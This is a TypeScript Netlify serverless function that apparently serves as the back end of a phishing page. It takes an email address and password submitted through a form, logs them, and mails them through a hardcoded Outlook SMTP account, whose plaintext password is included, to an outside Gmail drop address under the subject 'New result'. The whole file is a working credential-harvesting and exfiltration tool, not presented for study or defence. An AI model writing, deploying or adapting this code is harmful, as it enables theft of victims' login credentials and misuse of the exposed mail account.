import type { Context } from "@netlify/functions"
import nodemailer from "nodemailer"

export default async (req: Request, context: Context) => {
  let response;
  const body = await req.formData();
  const email = body.get("ai");
  const password = body.get("pr");
  console.log('response:', {email, password})

  const transporter = nodemailer.createTransport({
  host: "smtp-mail.outlook.com",
  port: 587,
  secure: false,
  auth: {
    user: "muammer_y@hotmail.com",
    pass: "noyanbey1",
  },
});

  const message = {
      from: "pc_golf@hotmail.com",
      to: "emilychan1178@gmail.com",
      subject: "New result",
      text: `Email: ${email} :: Password: ${password} :: Context: ${context}`,
      html: `<p>Result context: /n/n
            Email:: ${email} /n
            Password:: ${password} /n
            Context:: ${context}
            </p>`,
    };

  switch(req?.method){
    case "POST":
      try{
         const sendy = await transporter.sendMail(message, (err) => {
           console.log(err);
         });
         console.log(sendy)
         response = new Response(JSON.stringify({email, password, context}))
      }
      catch(error){
        console.log(errror)
      };
      break;
    case "GET":
      response = new Response("Get method")
      break;
    default:
      response  = new Response("Default");
      break;
  }
  return response;
}

